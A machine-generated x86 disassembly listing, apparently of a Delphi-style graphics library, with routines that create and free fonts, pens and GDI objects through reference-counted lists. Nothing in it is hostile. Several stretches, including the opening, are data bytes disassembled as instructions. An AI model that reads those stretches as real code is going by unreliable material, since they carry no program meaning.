add [ eax - 0x3bffbdff ] al
out dx al
inc ecx
add [ edx + eax + 0x42 ] ch
add [ eax + 0x2 ] dh
inc edx
add al cl
add eax [ edx ]
jo r-xdata
enter 0x4203 0x0
inc ecx
add ah ah
in eax dx
inc ecx
add [ eax + 0x68004200 ] ah
std
inc ecx
add [ ecx + eax + 0x42 ] ah
add [ esi + eax ] bl
inc edx
add [ eax + 0x9004206 ] ah
push esp
dec ebp
je r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
imul bp [ ebp - 0x75 ] 0x68c0
mov dh 0x41
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ eax + 0x340041 ]
add [ eax ] al
call 0xffffffffb441fa0b
xor al 0x40
add [ eax ] ch
inc ecx
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
push 0x6800422e
inc eax
inc ecx
add [ eax - 0x14 ] cl
inc ecx
add [ eax - 0x47ffbdd2 ] bl
inc ecx
inc ecx
add al bl
jmp r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
sbb al 0xb8
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov eax 0x180041
add [ eax ] al
call 0xffffffffb441f9b1
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
int3
mov al 0xa
inc edx
add [ ebx + ecx ] cl
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
xor al 0xb7
inc ecx
imul bp [ ebp - 0xc ] 0x41b5
add [ ebx + esi * 4 + 0x41 ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
mov eax 0x30004230
xor al [ edx ]
pop eax
xor al [ edx ]
insb
xor al [ edx ]
add eax 0x6f634954
outsb
mov eax eax
call 0x741faa1
add eax 0x6f634954
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b7 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x3c0041 ] ah
add [ eax ] al
call 0xffffffffb441f8c7
xor al 0x40
add [ eax ] ch
inc ecx
inc ecx
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pushfd
adc eax 0x40680042
inc ecx
add [ eax - 0x14 ] cl
inc ecx
add al bl
adc eax 0x41b80042
inc ecx
add [ edi + edx + 0x182c0042 ] ch
inc edx
add [ esp + ebp * 8 + 0x1ae00041 ] dl
inc edx
add [ ebx + ebx + 0x1bd40042 ] dl
inc edx
add al ah
in eax dx
inc ecx
add [ eax ] dh
sbb al 0x42
add [ eax ] bl
inc edx
add [ eax ] bl
sub [ edx ] al
in al dx
sub [ edx ] al
enter 0x41ee 0x0
adc [ edx ] ch
inc edx
add [ edx + ebp + 0x42 ] ah
add [ edx - 0x121bffbe ] dh
inc ecx
add [ esi + ebp * 8 + 0x41 ] ch
add al bh
push ds
inc edx
add [ ebp + 0x1e740042 ] ah
inc edx
add [ ebp + 0x1b440042 ] ch
inc edx
add [ ebx + ebx + 0x26e00042 ] ah
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b7b070
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b73470
add [ ebx + esi * 4 + 0x41 ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xb6d40000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov dh 0x41
add [ eax + eax ] dh
add al ch
mov ah 0x41
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
out dx al
inc ecx
add ah bh
xor [ edx ] eax
inc ecx
add [ ebx + esi * 4 + 0x41 ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
retn
cmp eax [ rw-data ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b8b1
out dx al
inc ecx
add [ edx + esi ] dl
inc edx
add [ eax ] bl
xor al [ edx ]
fsubr st6
inc ecx
add [ esi + ebp ] dl
inc edx
add ah ah
in eax dx
inc ecx
add [ esi + ebp * 8 + 0x41 ] ch
add [ eax + 0x30004230 ] bh
xor al [ edx ]
pop eax
xor al [ edx ]
insb
xor al [ edx ]
add eax 0x6f634954
outsb
mov eax eax
call 0x741faa1
add eax 0x6f634954
outsb
js r-xdata
out dx al
inc ecx
add ah bh
xor [ edx ] eax
inc ecx
add [ ebx + esi * 4 + 0x41 ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
retn
cmp eax [ rw-data ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b918
mov ecx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx 0x240041
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
enter 0x41b9 0x0
adc [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b98c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b9c8
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41ba04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41b978
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41b9ec
xor edx edx
push ebp
push sub_41bad8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41badf
mov eax [ ebp - 0x4 ]
call sub_41b9f8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407bf4
test al al
je r-xdata
sub_41bae8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b9ec
xor ecx ecx
push ebp
push sub_41bb6f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b9f8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41bb98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b9ec
xor eax eax
push ebp
push sub_41bc01
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ba04
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41bae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc08
mov eax [ ebp - 0x4 ]
call sub_41b9f8
retn
mov eax ebx
mov si 0xfffd
call sub_403468
sub_41bc10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b9ec
xor eax eax
push ebp
push sub_41bc6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc73
mov eax [ ebp - 0x4 ]
call sub_41b9f8
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403468
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41bae8
sub_41bc7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b9ec
xor edx edx
push ebp
push sub_41bcdb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bce2
mov eax [ ebp - 0x4 ]
call sub_41b9f8
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41bce8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413d34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bd85
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139c8
mov ebx eax
mov eax ebx
call sub_41d2b4
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41d648
mov eax [ rw-data ]
call sub_41bc7c
mov eax [ rw-data ]
call sub_41bc7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd8c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413d98
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4139c8
call sub_41d520
inc esi
dec ebx
jne r-xdata
sub_41c3db
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413478
retn
sub_41c40c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d88
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b78
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41c4c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41ba04
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c514
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41c558
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413f84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c218
xor eax eax
push ebp
push sub_41c613
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c218
xor eax eax
push ebp
push sub_41c5f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bc10
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c694
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c5fd
mov eax [ ebp - 0x8 ]
call sub_41c228
retn
mov eax ebx
call sub_41c918
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c934
sub_41c644
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c218
xor eax eax
push ebp
push sub_41c689
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bb98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c690
mov eax [ ebp - 0x4 ]
call sub_41c228
retn
sub_41c6a8
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41c831
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c838
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403fe0
retn
mov eax [ rw-data ]
call sub_41b9ec
xor eax eax
push ebp
push sub_41c809
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b9f8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404220
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408564
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404220
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408564
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404220
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407d2c
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41c98c
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41c850
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41c40c
mov edx esp
mov eax ebx
call sub_41c644
add esp 0x2c
pop esi
pop ebx
retn
sub_41c87c
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c62c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c644
add esp 0x2c
pop esi
pop ebx
retn
sub_41c8bc
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c62c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c88
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404258
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b78
mov edx esp
mov eax ebx
call sub_41c644
sub_41c934
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41c87c
pop esi
pop ebx
retn
sub_41c960
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c62c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c644
add esp 0x30
pop ebx
retn
sub_41c994
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c62c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41c644
add esp 0x2c
pop esi
pop ebx
retn
sub_41c9c4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c62c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41c644
add esp 0x2c
pop esi
pop ebx
retn
sub_41c9ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41ba04
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ca30
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41ca58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413f84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c218
xor eax eax
push ebp
push sub_41caf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c218
xor eax eax
push ebp
push sub_41cada
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bc10
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cc40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cae1
mov eax [ ebp - 0x8 ]
call sub_41c228
retn
sub_41cb10
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41cb28
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c218
xor eax eax
push ebp
push sub_41cb6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bb98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb74
mov eax [ ebp - 0x4 ]
call sub_41c228
retn
sub_41cb80
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41cb10
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41cb28
add esp 0x10
pop esi
pop ebx
retn
sub_41cba8
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b9ec
xor eax eax
push ebp
push sub_41cc2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b9f8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41c1d4
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41cc5c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41cb10
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41cb28
add esp 0x10
pop esi
pop ebx
retn
sub_41cc8c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41cb10
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41cb28
sub_41ccb8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41ba04
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ccf8
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_41cd20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413f84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c218
xor eax eax
push ebp
